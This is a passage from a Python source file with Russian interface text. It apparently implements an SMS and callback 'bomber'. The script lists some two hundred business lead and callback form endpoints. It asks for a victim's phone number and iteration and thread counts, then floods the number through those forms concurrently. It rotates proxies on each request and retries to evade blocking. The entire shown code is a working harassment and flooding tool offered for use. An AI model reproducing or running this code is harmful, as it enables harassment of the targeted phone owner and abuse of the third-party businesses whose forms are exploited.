    ("Avtoshkoli23_CF7", send_avtoshkoli23_cf7),
    ("DPO_Sochi", send_dpo_sochi),
    ("Alan_Avto_Ajax", send_alan_avto_ajax),
    ("DvigenieKZN_Ajax", send_dvigeniekzn_ajax),
    ("AlbatrosKazan", send_albatroskazan),
    ("Kazan_EcolesPB", send_kazan_ecolespb),
    ("XN80ajpfhbgomfh1b", send_xn80ajpfhbgomfh1b),
    ("Comagic_V2_Kazan", send_comagic_v2_kazan),
    ("CallTouch_38994", send_calltouch_38994),
    ("SPB_Pozitive_Org", send_spb_pozitive_org),
    ("Mobimas", send_mobimas),
    ("SPB_Clean", send_spb_clean),
    ("RedDragon_SPB", send_reddragon_spb),
    ("STO_Ducato", send_sto_ducato),
    ("Komp_Help_SPB", send_komp_help_spb),
    ("CallTouch_SPB_Clean", send_calltouch_spb_clean),
    ("CallTouch_23869", send_calltouch_23869),
    ("Lilians_Kazan", send_lilians_kazan),
    ("SPB_Ilosos_Asenizator", send_spb_ilosos_asenizator),
    ("Tomsk_OtKachki", send_tomsk_otkachki),
    ("599997", send_599997),
    ("Tomsk_Assenizator", send_tomsk_assenizator),
    ("Tomsk_Ilococ", send_tomsk_ilococ),
    ("Tomsk_AquaStrana", send_tomsk_aquastrana),
    ("Volgograd_Barssport", send_volgograd_barssport),
    ("Volgograd_Florens", send_volgograd_florens),
    ("Volgograd_KupiZabor_CF7", send_volgograd_kupitzabor_cf7),
    ("Volgograd_M300", send_volgograd_m300),
    ("Volgograd_Zabor_Company", send_volgograd_zabor_company),
    ("Stroitelstvo_Volgograd", send_stroitelstvo_volgograd),
    ("Volgograd_Barko", send_volgograd_barko),
    ("Volgograd_Zakaz_Zaborov", send_volgograd_zakaz_zaborov),
    ("Tara_Zabor_Profi", send_tara_zabor_profi),
    ("Zabory_V_Volgograde", send_zabory_v_volgograde),
    ("XN80aaaf5bhuqqcgf4j", send_xn80aaaf5bhuqqcgf4j),
    ("Lipetsk_SmartEco", send_lipetsk_smarteco),
    ("Flash48", send_flash48),
    ("StoGrand48", send_stogrand48),
    ("LDR48_CF7", send_ldr48_cf7),
    ("Viraj48", send_viraj48),
    ("ODSK_Lip_API", send_odsk_lip_api),
    ("DDXFitness_API", send_ddxfitness_api),
    ("Polyclinika_Ajax", send_polyclinika_ajax),
    ("Cifra_Bank_SMS", send_cifra_bank_sms),
    ("Pinskdrev_Recall", send_pinskdrev_recall),
    ("Wood_Brus_Recall", send_wood_brus_recall),
    ("Marya_SMS", send_marya_sms),
    ("Jetour_MCLipetsk_CF7", send_jetour_mclipetsk_cf7),
    ("BigMebel_Lipetsk_Ajax", send_bigmebel_lipetsk_ajax),
    ("Mango_Office_19273", send_mango_office_19273),
    ("Lipetsk_ZovOfficial", send_lipeck_zovofficial),
    ("NordITPro", send_norditpro),
    ("Anriko48_Chronoform", send_anriko48_chronoform),
    ("Lipetsk_Malo_Mesta", send_lipetsk_malo_mesta),
    ("Tride_Mebel_Chronoform", send_tride_mebel_chronoform),
    ("Glebbor_Mailer", send_glebbor_mailer),
    ("1Mebel_Room_NetCat", send_1mebel_room_netcat),
    ("Lipetsk_BestMebelShop", send_lipetsk_bestmebelshop),
    ("Lipetsk_Buryakof", send_lipeck_buryakof),
    ("Lipetsk_S5R", send_lipetsk_s5r),
    ("Lipetsk_Korona_Remont", send_lipeck_korona_remont),
    ("DveriNeva_Petrozavodsk", send_dverineva_petrozavodsk),
    ("Sampo_Stroy", send_sampo_stroy),
    ("Petrozavodsk_Sluzhba_Remonta", send_petrozavodsk_sluzhba_remonta),
    ("Petrozavodsk_Vse_Podklyuch", send_petrozavodsk_vse_podklyuch),
    ("Petrozavodsk_Expert123", send_petrozavodsk_expert123),
    ("Petrozavodsk_InnStroy", send_petrozavodsk_innstroy),
    ("ElektrikPetrozavodsk_CF7", send_elektrikpetrozavodsk_cf7),
    ("Sevist_Form", send_sevist_form),
    ("VodaOnline_Callback", send_vodaonline_callback),
    ("Waterline_Dostavka", send_waterline_dostavka),
    ("Aelita_Water_Ajax", send_aelita_water_ajax),
    ("OooSpatium_Bitrix", send_ooospatium_bitrix),
    ("Pyrus_Form", send_pyrus_form),
    ("Petrozavodsk_Svoy_Pitomnik", send_petrozavodsk_svoy_pitomnik),
    ("Petrozavodsk_Gor_Master", send_petrozavodsk_gor_master),
    ("MattuHouse_Form", send_mattuhouse_form),
    ("Petrozavodsk_Detskaya_Ploshadka", send_petrozavodsk_detskaya_ploshadka),
    ("Petrozavodsk_DMastera_CF7_v2", send_petrozavodsk_dmastera_cf7_v2),
    ("Petrozavodsk_Kamprok", send_petrozavodsk_kamprok),
    ("Petrozavodsk_TriBuketa", send_petrozavodsk_tribuketa),
    ("Petrozavodsk_TopSadovnik", send_petrozavodsk_topsadovnik),
    ("Autokod36_Callback", send_autokod36_callback),
    ("Mechanika_Pro_Chronoform", send_mechanika_pro_chronoform),
    ("VyezdService36_CF7", send_vyezdservice36_cf7),
    ("BiBi_RU_API", send_bibi_ru_api),
    ("Li_Auto_Voronezh_Ajax", send_li_auto_voronezh_ajax),
    ("Voronezh_BaikalSR_Bitrix", send_voronezh_baikalsr_bitrix),
    ("Voronezh_GarantStroyKompleks", send_voronezh_garantstroikompleks),
    ("VAG_Avtomir_VRN_API", send_vag_avtomir_vrn_api),
    ("IvartAuto_Callback", send_ivartauto_callback),
    ("Kia_FreshAuto_Ajax", send_kia_freshauto_ajax),
    ("Voronezh_Avtohous_Form", send_voronezh_avtohous_form),
    ("Avatr_Voronezh_Ajax", send_avatr_voronezh_ajax),
    ("Renault_Voronezh_CallMe", send_renault_voronezh_callme),
    ("Edem36_Contact", send_edem36_contact),
    ("Ritual_36_Ajax", send_ritual_36_ajax),
    ("Gos_CPS_Webforms", send_gos_cps_webforms),
    ("CSDent_AjaxForm", send_csdent_ajaxform),
    ("HarizmaDent", send_harizmadent),
    ("TomDent_API", send_tomdent_api),
    ("Stomatolog_VRN_Bitrix", send_stomatolog_vrn_bitrix),
    ("MC_Evsiyanie_Drupal", send_mcsevsiyanie_drupal),
    ("DentalCSP_CF7", send_dentalcsp_cf7),
    ("CallTouch_28884", send_calltouch_28884),
    ("Numedy_CallFromSite", send_numedy_callfromsite),
    ("Dyn_CRM_Bitrix", send_dyn_crm_bitrix),
    ("Artis_Dental_CF7", send_artis_dental_cf7),
    ("CallTouch_54213", send_calltouch_54213),
    ("Kristall62_Ajax", send_kristall62_ajax),
    ("Medicom_Plus_Ajax", send_medicom_plus_ajax),
    ("Schedule_Mozdrav", send_schedule_mozdrav),
    ("AvaClinic_Ajax", send_avaclinic_ajax),
    ("PKFSlovo_CF7", send_pkfslovo_cf7),
    ("Okna_Trast", send_okna_trast),
    ("BG76_Ajax", send_bg76_ajax),
    ("TMK24_Bitrix", send_tmk24_bitrix),
    ("UyutnyeOkna_SPB", send_uyutnyeokna_spb),
    ("YaroPlast_Balkony", send_yaroplast_balkony),
    ("StroyBalkon55_CF7", send_stroybalkon55_cf7),
    ("AS_Clinic_Ajax", send_as_clinic_ajax),
    ("Syn_SU_Lander", send_syn_su_lander),
    ("EGE_Study_Ajax", send_ege_study_ajax),
    ("Dav_ChanganAuto", send_dav_changanauto),
    ("FabulaSPb_CF7", send_fabulaspb_cf7),
    ("Kanna_Prav", send_kanna_prav),
    ("ZakonVSpb", send_zakonvspb),
    ("LA_Yurist_CF7", send_la_yurist_cf7),
    ("Nekropol76", send_nekropol76),
    ("Distancionnaya", send_distancionnaya),
    ("SotkaOnline_Feedback", send_sotkaonline_feedback),
    ("100Points_Ajax", send_100points_ajax),
    ("SPB_LSR_Back", send_spb_lsr_back),
    ("CallTouch_LSR", send_calltouch_lsr),
    ("CallTouch_59960", send_calltouch_59960),
    ("XN_ZhilKon_Thanks", send_xn_zhilkon_thanks),
    ("XN_Holodilniki_Thanks", send_xn_holodilniki_thanks),
    ("Nan_Servis_AddOrders", send_nan_servis_addorders),
    ("XN_Mod_Project_Lead", send_xn_mod_project_lead),
    ("XN76_CF7", send_xn76_cf7),
    ("Yaroslavl_GorMaster_Order", send_yaroslavl_gormaster_order),
    ("Nan_Center_TV", send_nan_center_tv),
    ("ZR_Remont_TV_Lead", send_zr_remont_tv_lead),
    ("Komp_ProffMasters_Send", send_komp_proffmasters_send),
    ("XN80aalenkmkh_CF7", send_xn80aalenkmkh_cf7),
    ("Zastroyshiki_Bitrix", send_zastroyshiki_bitrix),
    ("Silk_API_Callback", send_silk_api_callback),
    ("WhSteel_App", send_whsteel_app),
    ("Parquet_Pro", send_parquet_pro),
    ("SPB_Master_Bobr_SendIt", send_spb_master_bobr_sendit),
    ("SPB_Bekker_Peregorodki_Ajax", send_spb_bekker_peregorodki_ajax),
    ("CallTouch_72895", send_calltouch_72895),
    
    # НОВЫЕ ЭНДПОИНТЫ ИЗ APL9.TXT
    ("omsk_stretching", send_omsk_stretching),
    ("lenremont_new", send_lenremont_new),
    ("profishelp", send_profishelp),
    ("rosstroy76_new", send_rosstroy76_new),
    ("marquiz", send_marquiz),
    ("okna_wooden", send_okna_wooden),
    ("santehnika1", send_santehnika1),
    ("santehnika_room", send_santehnika_room),
    ("santehmoll", send_santehmoll),
    ("vosantehnik", send_vosantehnik),
    ("ruki_iz_plech", send_ruki_iz_plech),
    ("supermarket_santehniki", send_supermarket_santehniki),
    ("callibri_new", send_callibri_new),
    ("lbspace", send_lbspace),
    ("xn_7sbbspmsb6am8a", send_xn_7sbbspmsb6am8a),
    ("home_heat", send_home_heat),
    ("remont_electrici", send_remont_electrici),
    ("techemenergy", send_techemenergy),
    ("mos_elektrika", send_mos_elektrika),
    ("uslugi_elektrika", send_uslugi_elektrika),
    ("220toka", send_220toka),
    ("svet_i_to4ka", send_svet_i_to4ka),
    ("centrremsant", send_centrremsant),
    ("gor_master_new", send_gor_master_new),
    ("domashniy_masterok", send_domashniy_masterok),
    ("tilda_new", send_tilda_new),
    ("xn_htbbbqjs1apg", send_xn_htbbbqjs1apg),
    ("arline", send_arline),
    ("kostyukov", send_kostyukov),
    ("vira_bitrix", send_vira_bitrix),
    ("remont_fm", send_remont_fm),
    ("1000remontov", send_1000remontov),
    ("sdelano", send_sdelano),
    ("remont_kvartiry_msk", send_remont_kvartiry_msk),
    ("emailjs", send_emailjs),
    ("reforma_msk", send_reforma_msk),
    ("prochistka_vent", send_prochistka_vent),
    ("services_santehnik_moscow", send_services_santehnik_moscow),
    ("pereezd_ru", send_pereezd_ru),
    ("msk_gruzovichkof", send_msk_gruzovichkof),
    ("gruz24msk", send_gruz24msk),
    ("gruz_im", send_gruz_im),
    ("atlantgruz", send_atlantgruz),
    ("zel_luch", send_zel_luch),
    ("xn_c1aidaj7av7a", send_xn_c1aidaj7av7a),
    ("bruttocrm", send_bruttocrm),
    ("gruzchikoff", send_gruzchikoff),
    ("vyvoz_musora_moscow", send_vyvoz_musora_moscow),
    ("spetstrans", send_spetstrans),
    ("zabirator_new", send_zabirator_new),
    ("vyvoz_musora24", send_vyvoz_musora24),
    ("gruppabazis", send_gruppabazis),
    ("vivozmusara", send_vivozmusara),
    ("uvozim_musor", send_uvozim_musor),
    ("whitesaas_new", send_whitesaas_new),
    ("musorunet", send_musorunet),
    ("tpereezd", send_tpereezd),
    ("ooo_troya", send_ooo_troya),
    ("mct_rent", send_mct_rent),
    ("vanna_msk", send_vanna_msk),
    ("panel_remont", send_panel_remont),
    ("dom_asov", send_dom_asov),
    ("idealvann", send_idealvann),
    ("remont_wann", send_remont_wann),
    ("lidervann", send_lidervann),
    ("mossanuzel", send_mossanuzel),
    ("remmont", send_remmont),
    ("xn_6kcaiv0bpead0bpk1d", send_xn_6kcaiv0bpead0bpk1d),
]

# ==================== ОРКЕСТРАТОР С ПРОКСИ ====================
class RequestOrchestrator:
    def __init__(self, target_phone, endpoints, use_proxy, proxy_list, fallback=True):
        self.phones = normalize_phone(target_phone)
        self.endpoints = endpoints
        self.use_proxy = use_proxy
        self.proxy_list = proxy_list
        self.fallback = fallback
        self.stats = {"total":0,"success":0,"failed":0,"per_endpoint":{ep.name:{"success":0,"failed":0} for ep in endpoints}}
        self.start_time = None
        self.semaphore = asyncio.Semaphore(DEFAULT_CONCURRENT)
        self.running = True
        self.proxy_index = 0

    def get_next_proxy(self):
        if not self.proxy_list:
            return None
        proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
        self.proxy_index += 1
        return proxy

    async def send_with_retry(self, ep, iteration):
        if not self.running:
            return
        async with self.semaphore:
            proxy = self.get_next_proxy() if self.use_proxy else None
            for attempt in range(MAX_RETRIES + 1):
                try:
                    connector = aiohttp.TCPConnector(limit=1, ttl_dns_cache=300)
                    if proxy and proxy.startswith('socks5'):
                        try:
                            from aiohttp_socks import ProxyConnector
                            connector = ProxyConnector.from_url(proxy)
                        except ImportError:
                            pass
                    timeout = aiohttp.ClientTimeout(total=25, connect=15)
                    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                        status, response = await ep.func(session, self.phones)
                    self.stats["total"] += 1
                    if 200 <= status < 400:
                        self.stats["success"] += 1
                        self.stats["per_endpoint"][ep.name]["success"] += 1
                        proxy_str = f" via {proxy}" if proxy else ""
                        print(f"  {C.GREEN}[{status}]{C.RESET} {ep.name:<45} | iter {iteration+1}{proxy_str}")
                        return
                    else:
                        print(f"  {C.YELLOW}[{status}]{C.RESET} {ep.name:<45} | iter {iteration+1}")
                        if attempt < MAX_RETRIES:
                            await asyncio.sleep(RETRY_BACKOFF * (2 ** attempt))
                except Exception as e:
                    print(f"  {C.RED}[ERR]{C.RESET} {ep.name:<45} | {str(e)[:60]}")
                    if self.fallback and proxy and attempt == 0:
                        print(f"      {C.DIM}fallback: повтор без прокси{C.RESET}")
                        proxy = None
                        continue
                    if attempt < MAX_RETRIES:
                        await asyncio.sleep(RETRY_BACKOFF * (2 ** attempt))
            self.stats["failed"] += 1
            self.stats["per_endpoint"][ep.name]["failed"] += 1

    async def run(self, iterations):
        self.start_time = time.time()
        total = len(self.endpoints) * iterations
        print(f"\n{C.BRIGHT_MAGENTA}╔══════════════════════════════════════════════════╗{C.RESET}")
        print(f"{C.BRIGHT_MAGENTA}║{C.RESET}  ЗАПУСК — {len(self.endpoints)} эндпоинтов, {iterations} итераций")
        print(f"{C.BRIGHT_MAGENTA}║{C.RESET}  Всего запросов: {total:,}")
        if self.use_proxy:
            print(f"{C.BRIGHT_MAGENTA}║{C.RESET}  Прокси: ВКЛЮЧЕНЫ, ротация на каждый запрос, {len(self.proxy_list)} шт.")
        else:
            print(f"{C.BRIGHT_MAGENTA}║{C.RESET}  Прокси: ОТКЛЮЧЕНЫ")
        print(f"{C.BRIGHT_MAGENTA}╚══════════════════════════════════════════════════╝{C.RESET}\n")
        tasks = []
        for i in range(iterations):
            if not self.running:
                break
            for ep in self.endpoints:
                tasks.append(asyncio.create_task(self.send_with_retry(ep, i)))
            await asyncio.sleep(DEFAULT_DELAY)
        await asyncio.gather(*tasks, return_exceptions=True)
        self.print_stats()

    def print_stats(self):
        elapsed = time.time() - self.start_time
        print(f"\n{C.BRIGHT_MAGENTA}══════════════════════════════════════════════════{C.RESET}")
        print(f"СТАТИСТИКА ВЫПОЛНЕНИЯ")
        print(f"{C.BRIGHT_MAGENTA}══════════════════════════════════════════════════{C.RESET}")
        print(f"  Время:     {elapsed:.1f} сек")
        print(f"  Всего:     {self.stats['total']:,}")
        if self.stats['total'] > 0:
            rate = self.stats['success'] / self.stats['total'] * 100
            print(f"  {C.GREEN}Успешно:{C.RESET}   {self.stats['success']:,} ({rate:.1f}%)")
            print(f"  {C.RED}Ошибок:{C.RESET}    {self.stats['failed']:,} ({100-rate:.1f}%)")
        print(f"\n{C.BRIGHT_MAGENTA}ДЕТАЛИЗАЦИЯ ПО СЕРВИСАМ{C.RESET}")
        for name, data in self.stats["per_endpoint"].items():
            total_ep = data["success"] + data["failed"]
            if total_ep > 0:
                rate_ep = data["success"] / total_ep * 100
                color = C.GREEN if rate_ep > 70 else C.YELLOW if rate_ep > 30 else C.RED
                print(f"  {color}{name:<45}{C.RESET} | Успех: {data['success']:>4} | Ошибок: {data['failed']:>4} | {rate_ep:>5.1f}%")
        print(f"{C.BRIGHT_MAGENTA}══════════════════════════════════════════════════{C.RESET}")

# ==================== ТОЧКА ВХОДА ====================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

async def main():
    clear_screen()
    print(f"{C.BRIGHT_MAGENTA}")
    print("╔══════════════════════════════════════════════════╗")
    print("║                                    v12.0         ║")
    print("╚══════════════════════════════════════════════════╝")
    print(f"{C.RESET}")
    print(f"  {C.BRIGHT_CYAN}Thank you TehcnoButhcer{C.RESET}  |  {C.DIM}dev purpl{C.RESET}\n")
    
    # Загружаем прокси из файла
    load_proxies_from_file()

    phone = input(f"  {C.BRIGHT_CYAN}Введите номер телефона (+79XXXXXXXXX):{C.RESET} ").strip()
    if not phone or len(re.sub(r'\D', '', phone)) < 10:
        print(f"  {C.RED}Ошибка: некорректный номер{C.RESET}")
        return

    use_proxy_input = input(f"  {C.BRIGHT_CYAN}Использовать прокси? (y/n, по умолчанию y):{C.RESET} ").strip().lower()
    USE_PROXY = use_proxy_input != 'n' and len(PROXY_LIST) > 0
    if use_proxy_input == 'y' and len(PROXY_LIST) == 0:
        print(f"  {C.YELLOW}Нет прокси в файле! Работаем без прокси.{C.RESET}")
        USE_PROXY = False

    try:
        iterations = int(input(f"  {C.BRIGHT_CYAN}Количество итераций [{DEFAULT_ITERATIONS}]:{C.RESET} ") or DEFAULT_ITERATIONS)
        concurrent = int(input(f"  {C.BRIGHT_CYAN}Количество потоков [{DEFAULT_CONCURRENT}]:{C.RESET} ") or DEFAULT_CONCURRENT)
    except ValueError:
        print(f"  {C.RED}Ошибка: введите числа{C.RESET}")
        return

    gateways = [EndpointGateway(name=n, func=f) for n, f in endpoints_list]
    orchestrator = RequestOrchestrator(phone, gateways, USE_PROXY, PROXY_LIST, FALLBACK_NO_PROXY)
    orchestrator.semaphore = asyncio.Semaphore(concurrent)

    try:
        await orchestrator.run(iterations)
    except KeyboardInterrupt:
        orchestrator.running = False
        print(f"\n  {C.YELLOW}Прервано пользователем{C.RESET}")
    finally:
        print(f"\n  {C.BRIGHT_CYAN}Thank you TehcnoButhcer{C.RESET}  |  {C.DIM}dev purpl{C.RESET}")
        print(f"  {C.DIM}Завершено: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{C.RESET}\n")

if __name__ == "__main__":
    if os.name == 'nt':
        os.system('color')
    asyncio.run(main())